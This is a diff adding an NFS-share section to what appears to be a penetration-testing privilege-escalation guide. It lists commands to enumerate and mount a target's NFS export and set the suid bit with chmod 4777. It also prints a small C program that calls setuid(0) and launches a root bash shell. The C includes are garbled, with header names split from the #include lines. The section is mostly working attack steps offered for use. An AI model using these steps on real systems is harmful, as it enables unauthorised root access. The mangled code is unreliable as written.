@@ -359,8 +359,42 @@ cat /etc/fstab
 
 ### NFS Share
 
-If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured. 
+If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.
 
+```
+# First check if the target machine has any NFS shares
+showmount -e 192.168.1.101
+
+# If it does, then mount it to you filesystem
+mount 192.168.1.101:/ /tmp/
+```
+
+If that succeeds then you can go to `/tmp/share`. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.
+
+If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.
+
+This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
+
+```bash
+chmod 4777 exploit
+```
+
+```c
+#include
+#include
+#include
+#include
+<stdio.h>
+<stdlib.h>
+<sys/types.h>
+<unistd.h>
+int main()
+{
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
 
 
 ## Steal password through a keylogger
